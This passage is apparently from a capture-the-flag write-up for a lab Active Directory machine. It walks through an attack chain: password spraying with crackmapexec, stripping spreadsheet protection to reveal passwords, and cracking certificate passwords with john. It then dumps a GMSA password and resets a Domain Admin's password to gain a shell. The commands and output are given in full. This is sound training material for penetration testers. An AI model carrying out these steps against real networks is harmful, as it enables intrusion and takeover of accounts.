I need a text file with the usernames from LDAP. I’ll use `jq` to dump it from the `ldapdomaindump` JSON output. [This video](https://www.youtube.com/watch?v=cChCGrBNqFg) shows how I got to the final query:

The last command looks like:

```

oxdf@hacky$ cat domain_users.json | jq -r '.[].attributes.sAMAccountName[]' > ../users.txt

```

#### Spray

`crackmapexec` can take either a username or a filename containing usernames with the `-u` option, and same for the `-p` password option. `crackmapexec` will put out a line for every attempt, so I’ll use `grep` to get just the ones with `[+]` which means success:

```

oxdf@hacky$ crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]'
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby

```

I need `--continue-on-success` or it will stop once finding the known (or I could remove those from my users list). It finds one more - Edgar.Jacobs shares the same password with the service account.

## Shell as Siearra.Frye

### Enumeration

#### Bloodhound / LDAP

I’ll mark Edgar.Jacobs owned in Bloodhound. Unfortunately for me, this account doesn’t have any outbound control or other interesting access:

![image-20211117071207392](https://0xdfimages.gitlab.io/img/image-20211117071207392.png)

Clicking the play button on Transitive Object control shows the groups that the account is in:

[![image-20211117071358112](https://0xdfimages.gitlab.io/img/image-20211117071358112.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117071358112.png)

Nothing there looks particularly interesting. Edgar.Jacobs is a HelpDesk User from the London-HelpDesk group, which matches what was in the LDAP data:

[![image-20211117065652101](https://0xdfimages.gitlab.io/img/image-20211117065652101.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117065652101.png)

#### SMB

`smbmap` shows similar access to hope.sharp, but now I can access `helpdesk`:

```

oxdf@hacky$ smbmap -u edgar.jacobs -p '@3ONEmillionbaby' -H 10.10.11.129 --no-banner

[+] IP: 10.10.11.129:445        Name: 10.10.11.129              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

```

It’s empty:

```

oxdf@hacky$ smbclient -U edgar.jacobs //10.10.11.129/helpdesk
Enter WORKGROUP\edgar.jacobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  Dc        0  Tue Apr 14 06:24:23 2020
  ..                                 Dc        0  Tue Apr 14 06:24:23 2020

                5085183 blocks of size 4096. 2316954 blocks available

```

I’ll check `RedirectedFolders$` to see what edgar has (and if `user.txt` is on edgar.jacobs’ desktop).

```

oxdf@hacky$ smbclient //10.10.11.129/RedirectedFolders$ '@3ONEmillionbaby' -U edgar.jacobs
Try "help" to get a list of possible commands.
smb: \> cd edgar.jacobs\
smb: \edgar.jacobs\> recurse
smb: \edgar.jacobs\> ls
  .                                  Dc        0  Thu Apr  9 16:04:11 2020
  ..                                 Dc        0  Thu Apr  9 16:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020
  Documents                         DRc        0  Mon Aug 10 06:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Desktop
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

\edgar.jacobs\Documents
  .                                 DRc        0  Mon Aug 10 06:02:17 2020
  ..                                DRc        0  Mon Aug 10 06:02:17 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      402  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Downloads
  .                                 DRc        0  Mon Aug 10 06:02:17 2020
  ..                                DRc        0  Mon Aug 10 06:02:17 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Desktop\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:29 2020
  ..                               DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:30 2020

\edgar.jacobs\Documents\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:30 2020
  ..                               DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:31 2020

\edgar.jacobs\Downloads\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:30 2020
  ..                               DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:30 2020

                5085183 blocks of size 4096. 2316937 blocks available

```

No `user.txt`, but `Phishing_Attempt.xlsx`. I’ll download that:

```

smb: \edgar.jacobs\> get Desktop\Phishing_Attempt.xlsx 
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Desktop\Phishing_Attempt.xlsx (57.8 KiloBytes/sec) (average 57.8 KiloBytes/sec)

```

### Phishing\_Attempt.xlsx

#### Opening It

On opening the workbook in Libre Office Calc, it has two worksheets:

![image-20211117094800899](https://0xdfimages.gitlab.io/img/image-20211117094800899.png)

The Captured tab has some data in it:

![image-20211117094822813](https://0xdfimages.gitlab.io/img/image-20211117094822813.png)

The Passwords 01082020 tab has 14 rows of first, last, and username:

![image-20211117094859908](https://0xdfimages.gitlab.io/img/image-20211117094859908.png)

Column C is hidden, and trying to unhide it popus up:

![image-20211117094932577](https://0xdfimages.gitlab.io/img/image-20211117094932577.png)

#### Explore ~~Workbook~~ Archive

Modern Office documents are just Zip archives with XML files inside. I’ll unzip the file:

```

oxdf@hacky$ unzip Phishing_Attempt.xlsx
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/charts/chart1.xml
  inflating: xl/charts/style1.xml
  inflating: xl/charts/colors1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/worksheets/_rels/sheet2.xml.rels
  inflating: xl/drawings/_rels/drawing1.xml.rels
  inflating: xl/charts/_rels/chart1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/printerSettings/printerSettings2.bin
  inflating: xl/calcChain.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml 

```

Each sheet has an XML file in `xl/worksheets/`. The data itself is not protected. There is just a password in place that prevents modifications (like viewing the data). The data itself is not encrypted. There are lots of tutorials online like [this one](https://yodalearning.com/tutorials/unprotect-excel/) that explain how to remove that protection.

The information about the protection is in `xl/worksheets/sheet2.xml`:

[![image-20211117095939745](https://0xdfimages.gitlab.io/img/image-20211117095939745.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117095939745.png)

Specifically it’s this tag:

```

<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>

```

Interestingly, *some* of the data is in this file as well, specifically the usernames:

[![image-20211117100944887](https://0xdfimages.gitlab.io/img/image-20211117100944887.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117100944887.png)

If I add some whitespace to one of the rows, it looks like:

```

<row r="2" spans="1:4" x14ac:dyDescent="0.25">
    <c r="A2" t="s"><v>3</v></c>
    <c r="B2" t="s"><v>4</v></c>
    <c r="C2" t="s"><v>44</v></c>
    <c r="D2" t="str">
        <f t="shared" ref="D2:D7" si="0">A2&amp;"."&amp;B2</f>
        <v>Payton.Harmon</v>
    </c>
</row>

```

It’s interesting that the values for the first three columns aren’t there. If I `grep` for the string “Payton”, it shows up in this file and one more, `sharedStrings.xml`:

```

oxdf@hacky$ grep -ro Payton .
./xl/sharedStrings.xml:Payton
./xl/worksheets/sheet2.xml:Payton

```

The file has a `sst` object that says it has 49 unique strings, and then there’s a series of strings each wrapped in `<si><t>[string]</t></si>`:

[![image-20211117101635748](https://0xdfimages.gitlab.io/img/image-20211117101635748.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117101635748.png)

Looking at the values for the Payton row above, it references 3, 4, and 44. Assuming the references are a zero-based array, that files perfectly (pretty printed with `cat ./xl/sharedStrings.xml | xmllint --format -`):

```

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="49" uniqueCount="49">
  <si>           
    <t>firstname</t>                                
  </si>            
  <si>           
    <t>lastname</t>
  </si>        
  <si>          
    <t>password</t>                                 
  </si>                                             
  <si>              
    <t>Payton</t>                                   
  </si>
  <si>
    <t>Harmon</t>
  </si>
  <si>
    <t>Cortez</t>
  </si>
  <si>
    <t>Hickman</t>
  </si>
...[snip]...

```

I could rebuild the table from the raw data here, but it’s easier to just remove the protections.

#### Remove Protection

I’ll create a copy of the workbook file called `Phishing_Attempt-mod.zip`, and then find it in the file explorer in my Linux VM. I like to do this in the GUI because I can modify the file within the zip without having to decompress and recompress it.

I can find `sheet2.xml` in the archive editor:

![image-20211117102101918](https://0xdfimages.gitlab.io/img/image-20211117102101918.png)

Double clicking it will open it in a text editor, where I can just remove the full `sheetProtection` tag. When I hit save and close the text editor, the archive manager is warning:

![image-20211117102204031](https://0xdfimages.gitlab.io/img/image-20211117102204031.png)

I’ll click update, and now the change is made in the archive. Now I can change the extension back to `.xlsx`, and open it in Libre Office. The lock by the sheet name is gone:

![image-20211117102315767](https://0xdfimages.gitlab.io/img/image-20211117102315767.png)

And I can highlight columns B:D and right click:

![image-20211117102340746](https://0xdfimages.gitlab.io/img/image-20211117102340746.png)

On selecting “Show Columns”, the passwords are there:

![image-20211117102411772](https://0xdfimages.gitlab.io/img/image-20211117102411772.png)

### Check Passwords

`crackmapexec` can check these passwords. I don’t really want to try each password with each user, but just each user with the associated password. [This tweet](https://twitter.com/mpgn_x64/status/1255871323143897092) shows that the unintuitively named `--no-bruteforce` option will do just that:

> I just added the option '--no-bruteforce' to Crackmapexec allowing you to test multiple accounts at once👻  
>   
> I think this option can be useful when using CME with WinRM and MSSQL protocols against multiple targets 🔥 [pic.twitter.com/tTpqx7cgPt](https://t.co/tTpqx7cgPt)
>
> — mpgn (@mpgn\_x64) [April 30, 2020](https://twitter.com/mpgn_x64/status/1255871323143897092?ref_src=twsrc%5Etfw)

I’ll save the users to a file and the passwords to a file, and then give it a run:

```

oxdf@hacky$ crackmapexec smb 10.10.11.129 -u xlsx_users.txt -p xlsx_passwords.txt --no-bruteforce --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE 

```

One worked, Sierra.Frye with `$$49=wide=STRAIGHT=jordan=28$$18`.

This access provides `user.txt`:

```

oxdf@hacky$ smbclient //10.10.11.129/RedirectedFolders$ '$$49=wide=STRAIGHT=jordan=28$$18' -U sierra.frye
Try "help" to get a list of possible commands.         
smb: \> get sierra.frye\Desktop\user.txt 
getting file \sierra.frye\Desktop\user.txt of size 32 as sierra.frye\Desktop\user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
oxdf@hacky$ cat sierra.frye\\Desktop\\user.txt
ace9142c************************

```

### Access to Staff Page

#### Enumeration

Also in Sierra’s folders is `Downloads\Backups`, which contains certificates:

```

smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020

                5085183 blocks of size 4096. 2333095 blocks available

```

I’ll download both:

```

smb: \sierra.frye\Downloads\Backups\> get search-RESEARCH-CA.p12
getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (5.9 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \sierra.frye\Downloads\Backups\> get staff.pfx
getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx (9.7 KiloBytes/sec) (average 5.2 KiloBytes/sec)

```

#### Import Fail

In Firefox preferences, there’s a Certificate Manager. Under “Your Certificates”, I’ll click “Import…”:

![image-20211117114928990](https://0xdfimages.gitlab.io/img/image-20211117114928990.png)

For either of these, it asks for a password that I don’t have:

![image-20211117110052205](https://0xdfimages.gitlab.io/img/image-20211117110052205.png)

I tried the password from Windows, but it doesn’t work.

#### Crack Passwords

There’s a `pfx2john` script that comes with `john` that will generate hashes from these files:

```

oxdf@hacky$ pfx2john.py search-RESEARCH-CA.p12 > search-RESEARCH-CA.p12.hash
oxdf@hacky$ pfx2john.py staff.pfx > staff.pfx.hash

```

They each break in a minute or so to the same password, misspissy, with `rockyou.txt`:

```

oxdf@hacky$ john -w=/usr/share/wordlists/rockyou.txt staff.pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)     
1g 0:00:00:42 DONE (2021-11-17 11:06) 0.02346g/s 128684p/s 128684c/s 128684C/s misssnail..missnona16
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
oxdf@hacky$ john -w=/usr/share/wordlists/rockyou.txt search-RESEARCH-CA.p12.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (search-RESEARCH-CA.p12)     
1g 0:00:00:41 DONE (2021-11-17 11:08) 0.02434g/s 133541p/s 133541c/s 133541C/s misssnail..missnona16
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

The password is “misspissy” for both.

#### Access Page

Now I can import both into Firefox:

![image-20211117114907010](https://0xdfimages.gitlab.io/img/image-20211117114907010.png)

Now if on visiting or refreshing `https://search.htb/staff` (must be HTTPS), it asks for a certificate to send:

![image-20211117115137616](https://0xdfimages.gitlab.io/img/image-20211117115137616.png)

On clicking OK, Firefox presents a PowerShell Web Access page:

![image-20211117115225346](https://0xdfimages.gitlab.io/img/image-20211117115225346.png)

### PowerShell

I’ll enter sierra.frye’s creds into the form. For computer name, I tried a handful of things. The IP doesn’t work:

![image-20211117115648378](https://0xdfimages.gitlab.io/img/image-20211117115648378.png)

Trying different things, “research” works:

![image-20211117115727725](https://0xdfimages.gitlab.io/img/image-20211117115727725.png)

If I didn’t already have `user.txt`, I could grab it now.

## Shell as Tristan.Davies

### Bloodhound

Back in Bloodhound, I’ll mark Sierra.Frye as owned. Now the “Shortest Paths to Domain Admins from Owned Principles” brings out something nice:

![image-20211117122421371](https://0xdfimages.gitlab.io/img/image-20211117122421371.png)

By being in BIRMINGHAM-ITSEC, which is in ITSEC, Sierra.Frye has `ReadGMSAPassword` over BIR-ADFS-GMSA. That account has `GenericAll` over Tristan.Davies, who is in Domain Admins.

### Get Password

Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it. [This article](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/) shows how to create a GMSA, and how to manage the ACL for that password. It also shows how to use PowerShell to dump the GMSA password for the service account. I’ll follow the same steps:

```

PS C:\Users\Sierra.Frye\Documents> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents> $mp = $gmsa.'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents> ConvertFrom-ADManagedPasswordBlob $mp

Version                   : 1
CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤
                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇
SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 3062.06:26:26.3847903
UnchangedPasswordInterval : 3062.06:21:26.3847903

```

The `CurrentPassword` field looks like gibberish, but that’s the point of having a GMSA. Still, I can use it. I’ll save it in a variable:

```

PS C:\Users\Sierra.Frye\Documents> (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱
茾蒚⟒澽座걍盡篇
PS C:\Users\Sierra.Frye\Documents> $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
PS C:\Users\Sierra.Frye\Documents> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

```

I’m grabbing the Seucre version as well as that’s what I can use to run a command as the account.

### Reset Tristan’s Password

With full control over Tristan.Davies, I’ll reset the password to something I know. I’ll use `Invoke-Command` to run as BIR-ADFS-GSMA$ using a `PSCredential` object created using that accounts password from above:

```

PS C:\Users\Sierra.Frye\Documents> $cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass

PS C:\Users\Sierra.Frye\Documents> Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText '0xdf0xdf!!!' -force)} -Credential $cred

```

Now `crackmapexec` shows the new password works:

```

oxdf@hacky$ crackmapexec smb 10.10.11.129 -u tristan.davies -p '0xdf0xdf!!!'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:0xdf0xdf!!! (Pwn3d!)

```

The fact that it says “Pwn3d!” next to it means that the user is an administrator and that means PSexec and thing like that will get a shell.

### Shell

`wmiexec.py` works nicely:

```

oxdf@hacky$ wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies

```

And I can read `root.txt` from the administrator’s desktop:

```

C:\users\administrator\desktop>type root.txt
e53c27e0************************

```